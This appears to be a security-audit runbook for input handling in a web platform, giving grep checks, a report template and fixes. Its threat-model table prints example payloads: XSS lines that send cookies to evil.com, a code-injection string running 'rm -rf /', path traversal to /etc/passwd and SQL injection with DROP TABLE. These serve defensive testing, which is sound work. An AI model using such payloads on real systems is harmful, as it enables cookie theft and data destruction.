# Security audit — Input handling

> Verifies that every piece of data entering the system from outside is validated, sanitized, and never rendered raw as HTML. The primary defense against XSS and code injection.

---

## Trigger

Run:
- After any block that accepts user input is created or modified (BookingBlock, contact forms, search, newsletter signup).
- After any Route Handler (`app/api/**`) is added or changed.
- When `security-specialist` is invoked as a teammate in a diff review touching input handling.
- As part of the pre-deploy security checklist.

---

## Agent

`security-specialist` — read-only; produces a report only.

---

## Required reading

| File | What it defines |
|---|---|
| `docs/specs/security/security-standards.md` §Input handling | Validation pipeline, XSS prevention, file upload rules |
| `docs/specs/security/security-standards.md` §Output handling | Sanitize before HTML render, validate JSON from APIs |
| `docs/specs/frontend/coding-standards.md` §Anti-patterns | `dangerouslySetInnerHTML` prohibition |

---

## Threat model

| Threat | Attack vector | Example payload |
|---|---|---|
| Reflected XSS | User-supplied string rendered as raw HTML without escaping | `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` |
| Stored XSS | Malicious input persisted to DB then rendered | `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">` |
| Code injection via `eval` | User input passed to `eval()` or `new Function()` | `'); require('child_process').exec('rm -rf /');//` |
| Path traversal | File path from user input used in `fs` operations | `../../../etc/passwd` |
| SQL injection (if raw queries) | Unparameterized query constructed from user input | `' OR '1'='1`; `'; DROP TABLE bookings;--` |
| Form submission bypass | Client-side validation only; server ignores malformed body | Send crafted JSON without Content-Type, bypass React form |
| Accessibility via semantic HTML | `<div onClick>` instead of `<button>` breaks keyboard nav | Not a security issue but co-located with input audit |

---

## Steps

All grep commands run from `hwe-platform/` unless specified.

**Step 1 — Find all `dangerouslySetInnerHTML` usages**
```bash
grep -rn "dangerouslySetInnerHTML" apps/ packages/ --include="*.tsx" --include="*.ts"
```
For each match:
- Is the value sourced from Payload CMS rich text? If yes, is a sanitizer (`dompurify` or equivalent) applied before the render? → absent = **Blocker**
- Is the value sourced from user input directly? → **Blocker** (no exceptions)
- Is the value a hardcoded string literal? → **Pass** (static, trusted)

**Step 2 — Find `eval()` and `new Function()`**
```bash
grep -rn "eval(" apps/ packages/ --include="*.ts" --include="*.tsx" --include="*.mjs"
grep -rn "new Function(" apps/ packages/ --include="*.ts" --include="*.tsx" --include="*.mjs"
```
Expected: zero results.
- Any result → **Blocker**

**Step 3 — Find `innerHTML` assignments**
```bash
grep -rn "\.innerHTML\s*=" apps/ packages/ --include="*.ts" --include="*.tsx"
```
Expected: zero results (JSX should be used instead).
- Any result → **Major** (potential XSS bypass of React's default escaping)

**Step 4 — Verify Zod validation in every Route Handler**
```bash
grep -rn "request\.json()" apps/ --include="*.ts" --include="*.tsx" -l
```
This lists all Route Handlers that read the request body. For each file:
```bash
grep -n "request\.json()\|\.parse(\|Schema\." {file}
```
Expected: every file that calls `request.json()` must also call `.parse()` or similar Zod validation within the same handler before the body is used.
- `request.json()` without a Zod `.parse()` in the same file → **Blocker**

**Step 5 — Verify file upload handlers**
```bash
grep -rn "formData()\|multer\|formidable\|busboy" apps/ packages/ --include="*.ts" --include="*.tsx"
```
For each file upload handler found, verify:
- MIME type validated server-side (not by extension alone): look for `mimetype` or `type` checks → absent = **Major**
- Maximum file size enforced → absent = **Major**
- Executable extensions rejected (`.exe`, `.sh`, `.php`, `.js` uploads): look for extension blacklist or whitelist → absent = **Major**

**Step 6 — Check for `<div>` with click handlers (accessibility)**
```bash
grep -rn "<div[^>]*onClick" packages/core-ui/src/ --include="*.tsx"
```
Expected: zero results (interactive elements must be `<button>` or `<a>`).
- Any match → **Minor** (not a security vulnerability, but co-audited here as input-handling hygiene)

**Step 7 — Adversarial case verification**

For each active form (BookingBlock, contact, newsletter), manually test or document coverage for:
- XSS payload: `<script>alert('xss')</script>` in all text fields
- SQL injection pattern: `' OR '1'='1` in all text fields
- Path traversal: `../../../etc/passwd` in any field that may influence file paths
- Oversized input: a 100KB string in every text field

These tests confirm that Zod schemas enforce length limits and type constraints, not just presence.

---

## Output

```markdown
# Security Audit — Input Handling: {SLUG}

**Date:** {YYYY-MM-DD}
**Scope:** {files or blocks audited}

## dangerouslySetInnerHTML

| File | Source | Sanitizer | Severity |
|---|---|---|---|
| {path:line} | Payload CMS / User input / Static | dompurify ✓/✗ | Pass / Blocker |

## eval / new Function

| File | Usage | Severity |
|---|---|---|
| {path:line} | {description} | Blocker |

## Route Handler Zod coverage

| Handler | request.json() | Zod .parse() | Severity |
|---|---|---|---|
| `app/api/booking/route.ts` | Yes | Yes / No | Pass / Blocker |

## File upload handlers

| Handler | MIME check | Size limit | Extension whitelist | Severity |
|---|---|---|---|---|
| {path} | Yes / No | {limit or absent} | Yes / No | Pass / Major |

## Adversarial cases

| Form | XSS | SQL pattern | Path traversal | Oversized input |
|---|---|---|---|---|
| BookingBlock | Zod rejects ✓/✗ | Zod rejects ✓/✗ | N/A / Zod rejects | maxLength set ✓/✗ |

## Verdict

**Green** — no Blockers or Majors.
**Yellow** — Minor issues only.
**Red** — at least one Blocker or Major.
```

---

## Fix flow

1. **`dangerouslySetInnerHTML` without sanitizer:** wrap with `dompurify.sanitize(content)` before passing to `__html`. Document the security review in a `// Why:` comment.
2. **Missing Zod in Route Handler:** add `const body = BodySchema.parse(await request.json())` at the top of the handler. Define `BodySchema` using the same shape expected by the business logic.
3. **`eval` / `new Function`:** refactor to eliminate dynamic code execution. If unavoidable, isolate in a sandbox (e.g. Node.js `vm.runInNewContext` with a restricted context).
4. Re-run Steps 1–6 after each fix.

---

## Promotion gate

A block handling user input cannot advance past `alpha` with any **Blocker** input-handling finding. All forms must have server-side Zod validation before the block can be promoted to `beta`.

---

## In simple terms

Como `sanitize_text_field()` y `esc_html()` en cada handler de formulario de WordPress — pero aquí la herramienta es Zod en el Route Handler y JSX para el render.

**WordPress equivalent:** `wp_kses_post()` para rich text, `sanitize_text_field()` para campos simples, `wp_verify_nonce()` para CSRF. En hwe: Zod schema en el Route Handler + JSX por defecto (React escapa todo texto en JSX automáticamente, a menos que uses `dangerouslySetInnerHTML`).

**Day-to-day impact:** cuando crees un Route Handler que lea el body de una petición, la primera línea de código (después del `await request.json()`) debe ser un `Schema.parse()`. Si no está, es un Blocker en el pre-deploy audit.
